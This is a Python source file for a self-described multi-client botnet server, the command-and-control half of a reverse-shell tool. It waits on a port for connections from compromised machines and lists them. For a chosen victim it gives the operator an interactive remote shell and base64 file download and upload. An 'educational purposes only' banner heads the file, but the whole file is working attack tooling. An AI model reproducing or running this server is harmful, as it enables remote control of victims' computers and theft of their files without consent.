#!/usr/bin/python
import socket
import json
import os
import base64
import threading
import argparse
import sys
from colorama import Fore, Back, Style

# ASCII art banner
BANNER = '''

  ██████ ▄▄▄█████▓ ▒█████   ▒█████   ██▓     ██▓    
▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▓██▒    
░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ▒██░    
  ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ▒██░    
▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒░██████▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▓  ░
░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░ ▒  ░
░  ░  ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░     ░ ░   
      ░               ░ ░      ░ ░      ░  ░    ░  ░
                                                                                
    [+] Multi-Client Botnet Server [+]                                            
    [+] For Educational Purposes Only [+]                                        
    [+] Use Responsibly [+]                                                      
    [+] Created by iDOR [+]                                                                                                                            
    [===> CYBERNETIC INFILTRATION SUCCESS <===]
'''

# Function to display banner
def display_banner():
    print(Fore.GREEN + BANNER)

# Display the banner when the script runs
display_banner()

def clear_screen():
    """Clear the screen and redisplay banner and menu, but preserve the enter option area"""
    # Clear the screen
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # Unix/Linux/MacOS
        os.system('clear')
    
    # Redisplay banner and menu
    display_banner()
    display_menu()

# Function to display menu
def display_menu():
    print(Fore.GREEN + "1. Start Multi-Client Server" + Style.RESET_ALL)
    print(Fore.GREEN + "2. List Connected Clients" + Style.RESET_ALL)
    print(Fore.GREEN + "3. Select Client" + Style.RESET_ALL)
    print(Fore.GREEN + "4. Stop Server" + Style.RESET_ALL)
    print(Fore.GREEN + "5. Clear Screen" + Style.RESET_ALL)
    print(Fore.RED + "6. Exit" + Style.RESET_ALL)

# Global variables
ips = []
targets = []
clients = 0
stop_threads = False
s = None
current_target = None
current_address = None

# Main Server function
def server(ip, port):
    global s, clients, stop_threads, targets, ips
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, int(port)))
    s.listen(5)
    print(Fore.LIGHTGREEN_EX + f'[+] Multi-Client Server listening on {ip}:{port}...' + Style.RESET_ALL)
    
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target, address = s.accept()
            targets.append(target)
            ips.append(address)
            print(Fore.LIGHTGREEN_EX + f'[+] Client {len(targets)} connected from {address[0]}:{address[1]}' + Style.RESET_ALL)
            clients += 1
        except socket.timeout:
            continue
        except Exception as e:
            if not stop_threads:
                print(Fore.RED + f'[-] Error accepting connection: {e}' + Style.RESET_ALL)
            break

# Send Function
def send(data):
    if current_target:
        json_data = json.dumps(data)
        current_target.send(json_data.encode('utf-8'))

# Receive Function
def receive():
    if current_target:
        json_data = ''
        while True:
            try:
                json_data += current_target.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

# List connected clients
def list_clients():
    print(Fore.CYAN + "\n=== Connected Clients ===" + Style.RESET_ALL)
    if not targets:
        print(Fore.YELLOW + "No clients connected." + Style.RESET_ALL)
        return
    
    for i, ip in enumerate(ips):
        print(Fore.GREEN + f"Client {i}: {ip[0]}:{ip[1]}" + Style.RESET_ALL)

# Select client for interaction
def select_client():
    global current_target, current_address
    
    if not targets:
        print(Fore.YELLOW + "No clients connected." + Style.RESET_ALL)
        return
    
    list_clients()
    try:
        choice = int(input(Fore.LIGHTBLUE_EX + "Select client number: " + Style.RESET_ALL))
        if 0 <= choice < len(targets):
            current_target = targets[choice]
            current_address = ips[choice]
            print(Fore.LIGHTGREEN_EX + f"[+] Selected client {choice}: {current_address[0]}:{current_address[1]}" + Style.RESET_ALL)
            run()
        else:
            print(Fore.RED + "Invalid client number." + Style.RESET_ALL)
    except ValueError:
        print(Fore.RED + "Please enter a valid number." + Style.RESET_ALL)

# Run Command Function
def run():
    while True:
        if not current_target or not current_address:
            break
            
        command = input(Fore.LIGHTBLUE_EX + f"* Shell#~{current_address[0]} " + Style.RESET_ALL)
        
        if not command:
            continue
            
        send(command)

        if command == 'exit':
            break
        elif command[:8] == 'download':
            try:
                with open(command[9:], 'wb') as f:
                    file_data = receive()
                    f.write(base64.b64decode(file_data))
                print(Fore.LIGHTGREEN_EX + f"[+] File downloaded: {command[9:]}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[-] Download failed: {e}" + Style.RESET_ALL)
        elif command[:6] == 'upload':
            try:
                with open(command[7:], 'rb') as fin:
                    send(base64.b64encode(fin.read()).decode('utf-8'))
                print(Fore.LIGHTGREEN_EX + f"[+] File uploaded: {command[7:]}" + Style.RESET_ALL)
            except Exception as e:
                failed = f"Failed to Upload: {e}"
                send(failed)
                print(Fore.RED + f"[-] Upload failed: {e}" + Style.RESET_ALL)
        else:
            try:
                result = receive()
                if result:
                    print(Fore.LIGHTCYAN_EX + f'\n{result}' + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"[-] Error receiving data: {e}" + Style.RESET_ALL)

# Main Function
def main():
    global stop_threads, s
    
    parser = argparse.ArgumentParser(description="Multi-Client Botnet Server")
    parser.add_argument('ip', help="IP address of your server (e.g., 192.168.1.14)")
    parser.add_argument('port', help="Port of your server (e.g., 4444)")
    
    args = parser.parse_args()

    display_menu()

    while True:
        sys.stdout.write(f"\nEnter Option: ")
        sys.stdout.flush()
        choice = input()
        
        if choice == '1':
            stop_threads = False
            server_thread = threading.Thread(target=server, args=(args.ip, args.port))
            server_thread.daemon = True
            server_thread.start()
        elif choice == '2':
            list_clients()
        elif choice == '3':
            select_client()
        elif choice == '4':
            stop_threads = True
            if s:
                s.close()
            print(Fore.YELLOW + "[!] Server stopped." + Style.RESET_ALL)
        elif choice == '5':
            clear_screen()
        elif choice == '6':
            stop_threads = True
            if s:
                s.close()
            sys.exit()
        else:
            print(Fore.RED + "Invalid option. Please try again." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
